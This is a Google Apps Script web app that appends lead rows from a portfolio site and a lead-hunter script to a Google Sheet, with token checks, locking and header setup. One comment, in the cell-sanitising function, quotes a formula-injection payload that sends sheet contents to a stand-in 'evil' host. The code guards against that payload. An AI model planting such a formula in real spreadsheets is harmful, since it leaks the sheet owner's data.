/**
 * Sheersh Portfolio — lead capture → Google Sheet (shared sink)
 * =============================================================================
 * Google Apps Script web app. One POST from a producer appends one row to a Sheet
 * tab. Two producers share this sink:
 *
 *   • Form leads   — api/lead.js (Vercel)              → Source: "Form (website)"
 *   • Hunter leads — scripts/lead-hunter.js (Actions)  → Source: "Hunter (Reddit)" / …
 *
 * Paste-me instructions for the owner:  docs/GOOGLE-SHEET-SETUP.md
 * The 11-column row contract:           docs/GOOGLE-SHEET-SETUP.md (Eleven-column row)
 * Client redirect decision:             docs/DEPLOY-NOTES.md (Google Sheets)
 * Verified against a mock web app by:   npm run test:lead  (CASE 15–19)
 *
 * ── This script is deliberately dumb ─────────────────────────────────────────
 * It appends and creates the header. It does NOT know what a lead or a listing is,
 * and it does not map fields: every producer sends the already-normalised row
 *     POST  <WEBHOOK_URL>          {"row": ["<11 strings, in column order>"]}
 * Mapping logic lives in the producer, where it is version-controlled and testable.
 * Logic hidden in Google's editor is logic nobody can test — so there is none here.
 *
 * ── Why this file is committed ────────────────────────────────────────────────
 * Apps Script projects live in Google's editor, not in git, so the source is lost the
 * moment nobody remembers which account owns it. This file is the version-controlled
 * source of truth: the editor copy is the deployment, this is the code. Edit one, edit
 * both, and commit the change here.
 *
 * ── Two things Apps Script does that shape the code below ─────────────────────
 * 1. A web app answers `302` first and serves the real body from
 *    `script.googleusercontent.com`. Producers follow the redirect — a 302 is NOT
 *    treated as success.
 * 2. A web app **cannot set an HTTP status code** — a hard failure still comes back
 *    as `200`. Failure is therefore signalled in the JSON body as
 *    `{"ok": false, "error": "…"}`, which api/lead.js reads and counts as a failed
 *    write (it then still emails the lead rather than losing it).
 *
 * Generated by: backend-architect · Task T-009
 * =============================================================================
 */

/**
 * The canonical header — 11 columns, one header row, both producers.
 * Contract with api/lead.js and lead-hunter.js: do not reorder, do not rename.
 */
const HEADERS = [
  'Received',
  'Source',
  'Name / Title',
  'Company',
  'Email',
  'Project / Type',
  'Budget',
  'Score',
  'Message / Pitch',
  'Link',
  'ID'
];

const COLUMN_COUNT = HEADERS.length; // 11 — producers must send exactly this many values

/** Script properties (Project Settings → Script properties). All optional. */
const PROP_SHEET_ID = 'SPREADSHEET_ID'; // only for a standalone (not container-bound) script
const PROP_SHEET_NAME = 'SHEET_NAME'; // default: 'Leads'
const PROP_TOKEN = 'LEAD_WEBHOOK_TOKEN'; // if set, requests must carry ?token=<value>
const DEFAULT_SHEET_NAME = 'Leads';

const HEADER_BG = '#0f172a';
const HEADER_FG = '#ffffff';
const RECEIVED_FORMAT = 'yyyy-mm-dd hh:mm:ss';
const MAX_CELL_CHARS = 5000;
const LOCK_WAIT_MS = 15000;

/* ─────────────────────────────── entry points ───────────────────────────── */

/**
 * POST from a producer (form endpoint or hunter). Always answers 200 with a JSON body:
 *   { ok: true,  appended: true, row: 12 }
 *   { ok: false, error: 'row must be an array of exactly 11 values — got 10' }
 *                          ↑ producers treat this as a failed write and fall back to email
 */
function doPost(e) {
  try {
    const body = parseBody_(e);
    if (!body) {
      return respond_({
        ok: false,
        error: 'Body must be a JSON object (send Content-Type: application/json).'
      });
    }
    if (!isAuthorized_(e, body)) {
      return respond_({ ok: false, error: 'unauthorized: missing or wrong token' });
    }

    const check = validateRow_(body);
    if (!check.ok) return respond_({ ok: false, error: check.error });
    if (check.empty) {
      // Reachability probe / manual test with no values — not an error, nothing appended.
      return respond_({ ok: true, appended: false, note: 'empty row: nothing appended' });
    }

    const result = appendRow_(check.row);
    return respond_({ ok: true, appended: true, row: result.row, source: check.source });
  } catch (err) {
    // Surface the real reason in the body: this is the only channel a web app has.
    return respond_({ ok: false, error: String((err && err.message) || err) });
  }
}

/**
 * Open this URL in a browser to sanity-check the deployment. `?demo=1` appends a
 * clearly-labelled demo row so you can watch it work without touching the website.
 */
function doGet(e) {
  try {
    const params = (e && e.parameter) || {};
    const tokenRequired = Boolean(PropertiesService.getScriptProperties().getProperty(PROP_TOKEN));

    if (params.demo === '1') {
      if (!isAuthorized_(e, null)) return respond_({ ok: false, error: 'unauthorized: missing or wrong token' });
      const stamp = new Date().toISOString();
      const result = appendRow_([
        stamp,
        params.source || 'Demo',
        'DEMO ROW — delete me',
        '(setup check)',
        'demo@example.com',
        '',
        '',
        '',
        'Appended by doGet?demo=1 to verify the Sheet wiring. Safe to delete.',
        'deployment-check',
        'demo_' + stamp.replace(/[^0-9]/g, '').slice(0, 14)
      ]);
      return respond_({ ok: true, appended: true, demo: true, row: result.row });
    }

    const sheet = getSheet_();
    return respond_({
      ok: true,
      service: 'sheersh-lead-sheet',
      contract: 'POST {"row":[11 strings]}',
      columns: HEADERS.slice(),
      sheet: sheet.getName(),
      rows: Math.max(sheet.getLastRow() - 1, 0),
      tokenRequired: tokenRequired,
      note: 'Producers POST a normalised row here. Add ?demo=1 to append a demo row.'
    });
  } catch (err) {
    return respond_({ ok: false, error: String((err && err.message) || err) });
  }
}

/* ──────────────────────────────── the contract ─────────────────────────── */

/**
 * The whole of this script's input validation. Producers send the finished row, so
 * all that is left to check is that it is a row of the right width.
 * A missing/blank row is a no-op; a wrong-width row is a hard error, because
 * silently shifting every column would corrupt the sheet quietly.
 */
function validateRow_(body) {
  if (body.row === undefined || body.row === null) {
    return { ok: false, error: 'Missing "row": send {"row": ["…", 11 values]}.' };
  }
  if (!Array.isArray(body.row)) {
    return { ok: false, error: '"row" must be an array of exactly ' + COLUMN_COUNT + ' values.' };
  }
  if (body.row.length !== COLUMN_COUNT) {
    return {
      ok: false,
      error: '"row" must have exactly ' + COLUMN_COUNT + ' values — got ' + body.row.length + '.'
    };
  }
  const row = body.row.map(function (value, index) {
    return cell_(value, index === 0);
  });
  const empty = row.every(function (value) {
    return value === '';
  });
  return { ok: true, row: row, empty: empty, source: String(row[1] || '(unknown)') };
}

/* ───────────────────────────────── plumbing ─────────────────────────────── */

function respond_(payload) {
  return ContentService.createTextOutput(JSON.stringify(payload)).setMimeType(ContentService.MimeType.JSON);
}

function parseBody_(e) {
  const raw = e && e.postData && e.postData.contents;
  if (!raw) return null;
  try {
    const parsed = JSON.parse(raw);
    return parsed && typeof parsed === 'object' && !Array.isArray(parsed) ? parsed : null;
  } catch (err) {
    return null;
  }
}

/**
 * Auth note: Apps Script web apps expose NO request headers (`e.headers` does not
 * exist), so an `Authorization: Bearer …` header is invisible here. The token travels
 * in the URL query string:
 *     WEBHOOK_URL = https://script.google.com/macros/s/…/exec?token=THE_TOKEN
 * which also makes the URL itself a secret: never log it, never commit it, never
 * paste it into a screenshot or a chat.
 * With no LEAD_WEBHOOK_TOKEN script property the endpoint is open — acceptable
 * (the deployment URL is unguessable) but the token is the better default.
 */
function isAuthorized_(e, body) {
  const expected = PropertiesService.getScriptProperties().getProperty(PROP_TOKEN);
  if (!expected) return true;
  const params = (e && e.parameter) || {};
  const provided = params.token || (body && body.token) || '';
  return String(provided) === String(expected);
}

/** Spreadsheet + tab + header. Called before every append, so it is cheap on purpose. */
function getSheet_() {
  const props = PropertiesService.getScriptProperties();
  const id = props.getProperty(PROP_SHEET_ID);
  const ss = id ? SpreadsheetApp.openById(id) : SpreadsheetApp.getActiveSpreadsheet();
  if (!ss) {
    throw new Error(
      'No spreadsheet available. Either open this script from the Sheet via Extensions → Apps Script, ' +
        'or set the ' + PROP_SHEET_ID + ' script property to the spreadsheet id.'
    );
  }
  const name = props.getProperty(PROP_SHEET_NAME) || DEFAULT_SHEET_NAME;
  let sheet = ss.getSheetByName(name);
  if (!sheet) sheet = ss.insertSheet(name);
  ensureHeader_(sheet);
  return sheet;
}

/**
 * Creates the header row (and formats it) the first time, so an empty sheet just works.
 * Never rewrites a header already in place. If a sheet carries an older/different header
 * (for example a draft from before the 11-column contract), a new header row is inserted
 * above the data instead of overwriting anything — see the setup guide if that happens.
 */
function ensureHeader_(sheet) {
  const hasRows = sheet.getLastRow() > 0;
  const firstCell = hasRows ? String(sheet.getRange(1, 1).getValue() || '').trim() : '';

  if (firstCell === HEADERS[0]) {
    sheet.setFrozenRows(1);
    return false;
  }
  if (hasRows) {
    sheet.insertRowBefore(1); // rows exist but row 1 is not our header: insert, never overwrite
  }

  sheet
    .getRange(1, 1, 1, COLUMN_COUNT)
    .setValues([HEADERS])
    .setFontWeight('bold')
    .setBackground(HEADER_BG)
    .setFontColor(HEADER_FG);
  sheet.setFrozenRows(1);
  sheet.setColumnWidths(1, COLUMN_COUNT, 150);
  sheet.getRange(2, 1, Math.max(sheet.getMaxRows() - 1, 1), 1).setNumberFormat(RECEIVED_FORMAT);
  return true;
}

/**
 * Appends one row. LockService serialises concurrent writers: two webhooks landing in
 * the same instant would otherwise both see an empty sheet and both write a header row,
 * or interleave rows.
 */
function appendRow_(row) {
  const lock = LockService.getScriptLock();
  if (!lock.tryLock(LOCK_WAIT_MS)) {
    throw new Error('Could not get the sheet lock within ' + LOCK_WAIT_MS + 'ms (another write in flight).');
  }
  try {
    const sheet = getSheet_();
    sheet.appendRow(row);
    return { row: sheet.getLastRow() };
  } finally {
    lock.releaseLock(); // must run even if appendRow throws
  }
}

/**
 * Cell preparation, and the reason this is not just String(value):
 *
 * • Formula injection — the payload arrives from the public internet, and Sheets
 *   *executes* a cell starting with =, +, - or @. A lead named
 *   `=IMPORTXML("http://evil/?"&A1,"//x")` would exfiltrate the sheet. A leading
 *   apostrophe makes Sheets store the literal text.
 * • Absent values — the contract says "" for "not applicable"; null/undefined/"null"
 *   must never reach a cell, so they are normalised here too.
 * • Column 1 is parsed into a real timestamp when it looks like one, so the sheet
 *   sorts and reads properly.
 */
function cell_(value, isTimestamp) {
  if (value === undefined || value === null) return '';
  if (isTimestamp) {
    const parsed = new Date(String(value));
    if (!isNaN(parsed.getTime())) return parsed; // real instant; the sheet renders it in its own timezone
  }
  let s = String(value).replace(/[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f]/g, '');
  if (s === 'null' || s === 'undefined') s = '';
  if (s.length > MAX_CELL_CHARS) s = s.slice(0, MAX_CELL_CHARS) + '…[truncated]';
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
  return s;
}

/* ────────────────────── run me from the editor to check ─────────────────── */

/**
 * Run this once from the Apps Script editor (Run ▸ checkSetup) after deploying.
 * Read the result in View ▸ Logs. It proves the script, the Sheet and the header row
 * are wired together, without needing the website or the hunter.
 */
function checkSetup() {
  const props = PropertiesService.getScriptProperties();
  try {
    const sheet = getSheet_();
    const out = [
      'OK — sheet reachable: "' + sheet.getName() + '" (' + sheet.getParent().getName() + ')',
      'header row: ' + sheet.getRange(1, 1, 1, COLUMN_COUNT).getValues()[0].join(' | '),
      'data rows: ' + Math.max(sheet.getLastRow() - 1, 0),
      'token required: ' + Boolean(props.getProperty(PROP_TOKEN)),
      'spreadsheet id source: ' +
        (props.getProperty(PROP_SHEET_ID) ? PROP_SHEET_ID + ' script property' : 'container-bound (getActiveSpreadsheet)')
    ].join('\n');
    Logger.log(out);
    return out;
  } catch (err) {
    const message = 'FAILED — ' + String((err && err.message) || err);
    Logger.log(message);
    throw new Error(message);
  }
}
